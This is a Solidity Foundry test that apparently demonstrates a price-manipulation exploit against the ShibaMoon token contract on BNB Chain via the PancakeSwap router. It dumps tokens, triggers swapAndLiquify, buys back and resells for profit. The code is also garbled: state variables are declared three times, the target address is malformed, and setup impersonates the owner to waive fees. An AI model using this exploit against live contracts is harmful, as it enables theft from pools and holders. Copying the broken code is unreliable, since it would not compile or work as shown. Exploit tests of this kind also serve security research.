contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    ShibaMoon public target;
    IUniswapV2Router02 public router;
    address public wbnb;
    address public pair;

    uint256 constant NUM_TOKENS_SELL_TO_ADD_LIQUIDITY = 500000 * 10**6 * 10**8;
    ShibaMoon public target;
    IUniswapV2Router02 public router;
    address public wbnb;
    address public pair;

    uint256 constant NUM_TOKENS_SELL_TO_ADD_LIQUIDITY = 500000 * 10**6 * 10**8;
    address constant TARGET = 0xf7958ffcce46de09e0ab69b7da360c38b16266b;
    address attacker = address(this);
    ShibaMoon public target;
    IUniswapV2Router02 public router;
    address public wbnb;
    address public pair;

    uint256 constant NUM_TOKENS_TO_ADD_LIQUIDITY = 500000 * 10**6 * 10**8;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = ShibaMoon(TARGET);
        router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        wbnb = router.WETH();
        pair = target.uniswapV2Pair();

        // Give attacker a lot of native ETH and a lot of ShibaMoon tokens
        deal(attacker, 1000 ether);
        uint256 amountToDeal = NUM_TOKENS_TO_ADD_LIQUIDITY * 100;
        deal(address(target), attacker, amountToDeal);

        // We need to set the contract's balance. To do this without fees, we exclude ourselves from fees.
        // This requires being the owner.
        vm.startPrank(target.owner());
        target.excludeFromFee(attacker);
        vm.stopPrank();

        // Set up the precondition: target contract balance is just below the threshold
        uint256 amountToPreload = NUM_TOKENS_TO_ADD_LIQUIDITY - 1e8;
        target.transfer(TARGET, amountToPreload);

        // Verify precondition
        assertEq(target.balanceOf(TARGET), amountToPreload);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 attackerInitialETH = attacker.balance;

        // 1. Manipulate Price: Swap a large amount of ShibaMoon for ETH, crashing the price.
        uint256 amountToDump = NUM_TOKENS_SELL_TO_ADD_LIQUIDITY * 50;
        target.approve(address(router), amountToDump);

        address[] memory path = new address[](2);
        path[0] = address(target);
        path[1] = wbnb;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToDump,
            0, // accept any amount of ETH
            path,
            attacker,
            block.timestamp
        );

        uint256 ethGainedFromDump = attacker.balance - attackerInitialETH;

        // 2. Trigger swapAndLiquify
        // The transfer is feeless because we excluded the attacker (from) address in setUp.
        uint256 triggerAmount = 2e8;
        target.transfer(TARGET, triggerAmount);

        // 3. Re-invest the ETH gained from the dump to buy back Shiba at the crashed price
        address[] memory path2 = new address[](2);
        path2[0] = wbnb;
        path2[1] = address(target);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethGainedFromDump}(
            0, // get max tokens out
            path2,
            attacker,
            block.timestamp
        );

        // 4. Now holding a large amount of Shiba, sell it all back to ETH.
        uint256 finalShibaBalance = target.balanceOf(attacker);
        target.approve(address(router), finalShibaBalance);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            finalShibaBalance,
            0, // get max ETH out
            path, // [Shiba -> ETH]
            attacker,
            block.timestamp
        );

        // 5. Check profit
        uint256 attackerFinalETH = attacker.balance;
        assertGt(attackerFinalETH, attackerInitialETH);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

